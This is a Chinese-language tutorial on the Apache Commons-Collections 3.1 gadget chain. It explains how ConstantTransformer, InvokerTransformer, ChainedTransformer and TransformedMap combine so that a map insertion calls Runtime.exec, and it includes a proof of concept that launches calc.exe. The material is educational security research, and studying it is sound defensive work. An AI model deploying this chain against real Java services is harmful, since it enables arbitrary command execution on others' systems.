## 02 CommonsCollections_前置

在学习cc1之前，我们先了解一下`commons-collections-3.1`

Apache Commons  Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。

由浅入深，先看看P神的极致简化版：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc.exe"}),
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

这个POC中涉及到了`TransformedMap，ConstantTransformer，InvokerTransformer，ChainedTransformer`，这些类全部实现了`Transformer` 接口。

### Transformer

Transformer接口中的transform方法要求传入一个对象，并且返回值也是一个对象

```java
public interface Transformer {
    public Object transform(Object input);
}
```

### ConstantTransformer

ConstantTransformer调用transform方法时会直接返回构造函数中传入的对象，他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。

```java
public ConstantTransformer(Object constantToReturn) {
    super();
    iConstant = constantToReturn;
}
public Object transform(Object input) {
    return iConstant;
}
```

### InvokerTransformer

InvokerTransformer的transform方法中利用了反射，通过反射调用我们传入的类中的方法，所以这类其实就是我们执行恶意命令的核心类。在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。

```java
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);  
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

### ChainedTransformer

ChainedTransformer类实例化的时候接受一个 Transformer[] 数组，即列表中的所有元素都要实现  Transformer  接口，同时在transform方法中会对Transformer数组中的元素按照顺序调用transform方法，同时将上一个元素的返回对象作为输入传递给下一个元素的transform方法中

```java
public ChainedTransformer(Transformer[] transformers) {
    super();
    iTransformers = transformers;
}
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

ChainedTransformer负责将各个类进行串联，也就是前⼀个回调返回的结果，作为后⼀个回调的参数传⼊：

![img](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20210216100933244.png)

### TransformedMap

TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可

以执⾏⼀个回调。



## POC分析

```java
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc.exe"}),
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
```

我们创建了一个ChainedTransformer，其中包含两个Transformer：第⼀个是ConstantTransformer，直接返回当前环境的Runtime对象；第⼆个是InvokerTransformer，执⾏Runtime对象的exec⽅法，参数是`calc.exe`

这个transformerChain只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的

TransformedMap.decorate ：

```java
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
```

最后向Map中放入一个新元素来触发回调

```java
outerMap.put("test", "xxxx");
```

